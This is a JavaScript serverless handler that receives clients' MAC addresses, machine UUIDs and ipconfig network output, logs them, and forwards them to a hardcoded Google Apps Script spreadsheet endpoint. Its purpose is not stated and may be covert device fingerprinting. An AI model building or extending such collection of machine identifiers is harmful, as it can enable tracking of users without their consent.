export default async function handler(req, res) {
  if (req.method !== "POST") return res.status(405).send("Method Not Allowed");

  const { mac, uuid, ipconfig } = req.body || {};
  const log = `[${new Date().toISOString()}] MAC: ${mac} | UUID: ${uuid} | IPINFO: ${ipconfig}`;

  console.log("Received from client:", log);

  // (Optional) Forward to Google Sheet via Apps Script:
  await fetch("https://script.google.com/macros/s/AKfycbx8msWLHxw2XY9SoiPaIG1pBiGxoyTBrCfvZEj2odJnPqcwxVS02ArIqcXxLnSNLTFn/exec", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: new URLSearchParams({ mac, uuid, ipconfig })
  });

  res.status(200).send("Logged");
}
